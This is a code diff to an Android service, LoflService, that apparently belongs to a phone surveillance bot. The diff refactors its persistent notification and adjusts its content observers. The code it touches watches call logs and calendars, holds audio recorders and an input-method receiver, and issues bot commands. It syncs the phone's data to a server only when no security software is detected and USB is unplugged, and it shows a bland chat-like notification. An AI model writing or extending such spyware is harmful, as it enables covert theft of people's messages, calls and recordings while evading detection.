@@ -1,6 +1,10 @@
 package com.candroid.lofl.services;
 
 import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -9,14 +13,11 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.ContentObserver;
 import android.database.Cursor;
-import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Handler;
-import android.os.HandlerThread;
 import android.os.IBinder;
-import android.os.Looper;
 import android.os.Process;
 import android.preference.PreferenceManager;
 import android.provider.CalendarContract;
@@ -24,11 +25,10 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.candroid.lofl.activities.LoflActivity;
 import com.candroid.lofl.api.Apps;
 import com.candroid.lofl.api.Bot;
-import com.candroid.lofl.api.NotificationFactory;
 import com.candroid.lofl.api.Systems;
-import com.candroid.lofl.data.Commands;
 import com.candroid.lofl.data.Constants;
 import com.candroid.lofl.data.db.Database;
 import com.candroid.lofl.data.db.DatabaseHelper;
@@ -44,6 +44,7 @@ import com.candroid.lofl.receivers.WifiReceiver;
 
 public class LoflService extends Service {
 
+    public static final String NOTIFICATION_CLICK_ACTIVITY = "NOTIFICATION_CLICK_ACTIVITY";
     private static final String TAG = LoflService.class.getSimpleName();
     public static boolean sHasCalledHome = false;
     public static boolean sIsRunning = false;
@@ -61,9 +62,6 @@ public class LoflService extends Service {
     private LocationManager mLocationManager;
     public static MediaRecorder sMediaRecorder;
     private ImeReceiver mImeReceiver;
-    private LocationListener mLocationListener;
-    private HandlerThread mHandlerThread;
-    private Looper mLooper;
     public static Recorder sRecorder;
     public static boolean sIsBot;
     public LoflService() {
@@ -72,7 +70,7 @@ public class LoflService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, NotificationFactory.createPersistentServiceNotification(this));
+        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, createPersistentServiceNotification(this));
         //JobsScheduler.scheduleJob(this);
         sIsRunning = true;
         mIncomingReceiver = new IncomingReceiver();
@@ -134,7 +132,7 @@ public class LoflService extends Service {
         mObserver = new SmsObserver();
         mCallLogObserver = new CallLogObserver();
         mCalendarObserver = new CalendarObserver();
-        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
+        //getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
         if(this.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
             getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
         }
@@ -167,7 +165,7 @@ public class LoflService extends Service {
                     Bot.onReceiveCommand(LoflService.this, 21, "start", null);
                     boolean hasSecuritySoftware = Apps.hasSecuritySoftwareInstalled(LoflService.this);
                     if( ! hasSecuritySoftware && Systems.Usb.isUsbDisconnected(LoflService.this)){
-                        Bot.onReceiveCommand(LoflService.this, Commands.SYNC_PHONE_TO_SERVER, null, null);
+                        Bot.onReceiveCommand(LoflService.this, Bot.Commands.SYNC_PHONE_TO_SERVER, null, null);
                     }
                 }
             }).start();
@@ -359,5 +357,37 @@ public class LoflService extends Service {
         if(sRecorder != null){
             sRecorder.stop();
         }
+    }
+
+    private static void createPersistentForegroundNotificationChannel(Context context) {
+        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+        if(notificationManager.getNotificationChannel(Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID) == null){
+            NotificationChannel notificationChannel = new NotificationChannel(Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID, Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID, NotificationManager.IMPORTANCE_DEFAULT);
+            notificationChannel.enableVibration(false);
+            notificationChannel.enableLights(false);
+            notificationManager.createNotificationChannel(notificationChannel);
+        }
+    }
+
+    public static Notification createPersistentServiceNotification(Context context) {
+        createPersistentForegroundNotificationChannel(context);
+        String activityName = PreferenceManager.getDefaultSharedPreferences(context).getString(NOTIFICATION_CLICK_ACTIVITY, LoflActivity.class.getName());
+        Intent intent = null;
+        try {
+            intent = new Intent(context, Class.forName(activityName));
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+            intent = new Intent(context, LoflActivity.class);
+        }
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+        Notification.Builder builder = new Notification.Builder(context, Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID);
+        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);
+        builder.setContentIntent(pendingIntent);
+        builder.setSmallIcon(android.R.drawable.stat_notify_chat);
+        builder.setContentTitle("listening for whispers");
+        builder.setContentText("press to whisper");
+        builder.setColorized(true);
+        builder.setColor(context.getResources().getColor(android.R.color.holo_green_dark));
+        return builder.build();
     }
 }
